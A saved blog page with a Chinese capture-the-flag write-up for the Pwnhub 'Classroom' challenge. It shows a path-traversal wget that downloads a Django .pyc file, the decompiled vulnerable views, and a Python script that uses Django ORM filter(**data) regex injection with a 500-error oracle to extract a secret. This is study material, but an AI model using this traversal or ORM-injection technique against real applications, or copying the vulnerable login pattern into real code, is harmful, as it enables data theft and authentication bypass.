@@ -1,0 +1,337 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Pwnhub-Classroom-Writeup - l3m0n - 博客园</title>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/Pwnhub_Classroom_Writeup.html" id="cb_post_title_url">Pwnhub-Classroom-Writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>页面中有一个js：<a class="uri" href="http://54.223.46.206:8003/static/js/login.js">http://54.223.46.206:8003/static/js/login.js</a><br/>
+发现是能够进行文件读取的(具体见：<a class="uri" href="http://wooyun.jozxing.cc/static/drops/papers-5040.html">http://wooyun.jozxing.cc/static/drops/papers-5040.html</a> )，但是对conf、py等后缀做了限制。<br/>
+<img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165521068-2053813461.png"/></p>
+<p>通过http的返回头也知道一些信息：Server:gunicorn/19.6.0 Django/1.10.3 CPython/3.5.2</p>
+<p>python3.x预编译文件会产生pyc<br/>
+为了提高模块加载的速度，每个模块都会在<code>__pycache__</code>文件夹中放置该模块的预编译模块，命名为module.version.pyc,version是模块的预编译版本编码，一般都包含Python的版本号。例如在CPython 发行版3.4中，fibo.py文件的预编译文件就是：<code>__pycache__/fibo.cpython-34.pyc</code></p>
+<p>一个Django的一开始的配置文件：<br/>
+<img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165532084-423016766.png"/></p>
+<p><img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165600412-1301387176.png"/></p>
+<p>所以可以先从这几个文件下手。</p>
+<p>另外还有view.py和model.py</p>
+<p>下载pyc文件</p>
+<pre><code>wget 54.223.46.206:8003/static/%2e%2e/__pycache__/views.cpython-35.pyc</code></pre>
+<p>用uncompyle6反编译pyc成py</p>
+<p>urls.py</p>
+<pre><code>from django.conf.urls import url
+from . import views
+urlpatterns = [
+ url('^$', views.IndexView.as_view(), name='index'),
+ url('^login/$', views.LoginView.as_view(), name='login'),
+ url('^logout/$', views.LogoutView.as_view(), name='logout'),
+ url('^static/(?P&lt;path&gt;.*)', views.StaticFilesView.as_view(), name='static')]</code></pre>
+<p>model.py</p>
+<pre><code>from django.db import models
+
+class Student(models.Model):
+    name = models.CharField('', max_length=64, unique=True)
+    no = models.CharField('', max_length=12, unique=True)
+    passkey = models.CharField('', max_length=32)
+    group = models.ForeignKey('Group', verbose_name='', on_delete=models.CASCADE, null=True, blank=True)
+
+    class Meta:
+        verbose_name = ''
+        verbose_name_plural = verbose_name
+
+    def __str__(self):
+        return self.name
+
+class Group(models.Model):
+    name = models.CharField('', max_length=64)
+    information = models.TextField('')
+    secret = models.CharField('', max_length=128)
+    created_time = models.DateTimeField('', auto_now_add=True)
+
+    class Meta:
+        verbose_name = ''
+        verbose_name_plural = verbose_name
+
+    def __str__(self):
+        return self.name</code></pre>
+<p>view.py</p>
+<pre><code>import json
+import os
+from wsgiref.util import FileWrapper
+from django.shortcuts import render, redirect
+from django.urls import reverse_lazy
+from django.views import generic
+from django.http import JsonResponse
+from django.core import exceptions
+from django.http import HttpResponse, Http404
+from django.conf import settings
+from django.db.models import F
+from . import models
+
+class RequireLoginMixin(object):
+    login_url = reverse_lazy('students:login')
+
+    def handle_no_permission(self):
+        return redirect(self.login_url)
+
+    def dispatch(self, request, *args, **kwargs):
+        if request.session.get('is_login', None) != True:
+            return self.handle_no_permission()
+        return super(RequireLoginMixin, self).dispatch(request, *args, **kwargs)
+
+class JsonResponseMixin(object):
+
+    def _jsondata(self, msg, status_code=200):
+        return JsonResponse({'message': msg}, status=status_code)
+
+class LoginView(JsonResponseMixin, generic.TemplateView):
+    template_name = 'login.html'
+
+    def post(self, request, *args, **kwargs):
+        data = json.loads(request.body.decode())
+        stu = models.Student.objects.filter(**data).first()
+        if not stu or stu.passkey != data['passkey']:
+            return self._jsondata('', 403)
+        else:
+            request.session['is_login'] = True
+            return self._jsondata('', 200)
+
+class LogoutView(RequireLoginMixin, JsonResponseMixin, generic.RedirectView):
+    url = reverse_lazy('students:login')
+
+    def get(self, request, *args, **kwargs):
+        request.session.flush()
+        return super(LogoutView, self).get(request, *args, **kwargs)
+
+class IndexView(RequireLoginMixin, JsonResponseMixin, generic.TemplateView):
+    template_name = 'index.html'
+
+    def post(self, request, *args, **kwargs):
+        ret = []
+        for group in models.Group.objects.all():
+            ret.append(dict(name=group.name, information=group.information, created_time=group.created_time, members=list(group.student_set.values('name', 'id').all())))
+
+        return self._jsondata(ret, status_code=200)
+
+class StaticFilesView(generic.View):
+    content_type = 'text/plain'
+
+    def get(self, request, *args, **kwargs):
+        filename = self.kwargs['path']
+        filename = os.path.join(settings.BASE_DIR, 'students', 'static', filename)
+        name, ext = os.path.splitext(filename)
+        if ext in ('.py', '.conf', '.sqlite3', '.yml'):
+            raise exceptions.PermissionDenied('Permission deny')
+            try:
+                return HttpResponse(FileWrapper(open(filename, 'rb'), 8192), content_type=self.content_type)
+            except BaseException as e:
+                raise Http404('Static file not found')</code></pre>
+<p>其中在loginView里面有个关键的地方就是</p>
+<pre><code>data = json.loads(request.body.decode())
+stu = models.Student.objects.filter(**data).first()
+if not stu or stu.passkey != data['passkey']:</code></pre>
+<p>看下官方文档：<br/>
+<img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165734724-727294275.png"/></p>
+<p>filter是接收关键字变量参数(字典类型)，**kwargs<br/>
+<img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165747552-1579340157.png"/></p>
+<p>其中filter是作为条件语句使用的，类似where，里面的参数相当于条件，多条件的时候是以and连接。这也表示where后面的条件我们是可控的。于是可以形成注入。</p>
+<p>看下filter中的操作关键字</p>
+<pre><code>operators = {
+        'exact': '= %s',
+        'iexact': 'LIKE %s',
+        'contains': 'LIKE BINARY %s',
+        'icontains': 'LIKE %s',
+        'regex': 'REGEXP BINARY %s',
+        'iregex': 'REGEXP %s',
+        'gt': '&gt; %s',
+        'gte': '&gt;= %s',
+        'lt': '&lt; %s',
+        'lte': '&lt;= %s',
+        'startswith': 'LIKE BINARY %s',
+        'endswith': 'LIKE BINARY %s',
+        'istartswith': 'LIKE %s',
+        'iendswith': 'LIKE %s',
+    }</code></pre>
+<p>比如startswith，</p>
+<p><img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165832927-906777688.png"/></p>
+<pre><code>        if not stu or stu.passkey != data['passkey']:
+            return self._jsondata('', 403)
+        else:
+            request.session['is_login'] = True
+            return self._jsondata('', 200)</code></pre>
+<p>filter查询有结果，但是没有data['passkey']这个值传入的话，python会报500的错误。</p>
+<p>exp:</p>
+<pre><code>import requests
+import  json
+
+url = "http://54.223.46.206:8003/login/"
+
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+payload = "abcdefghijklmnopqrstuvwxyz0123456789:"
+current_data = ""
+
+def check(current_data):
+    temp = current_data
+    for p in payload:
+        temp += p
+        data = "^%s.*" % temp
+        post_data = "%s" %  json.dumps({"name__regex": data})
+        r = requests.post(url,data=post_data,headers = headers)
+        if r.status_code == 500:
+            return p
+        temp = current_data
+
+for k in range(80):
+    current_data += check(current_data)
+    print "%dth data: %s" % (k,current_data)</code></pre>
+<p>在model.py中还有一个Group表，Student的外键就是它。<br/>
+所以可以通过外键查询group的secret。<br/>
+group__secret__regex</p>
+<p>最后get flag。<br/>
+<img src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/804631-20161204165905443-1442921534.png"/></p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-12-04 17:00</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6131180" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6131180);return false;">收藏</a></div>
+</div>
+<script src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6131180,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/12/4 17:00:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./Pwnhub-Classroom-Writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
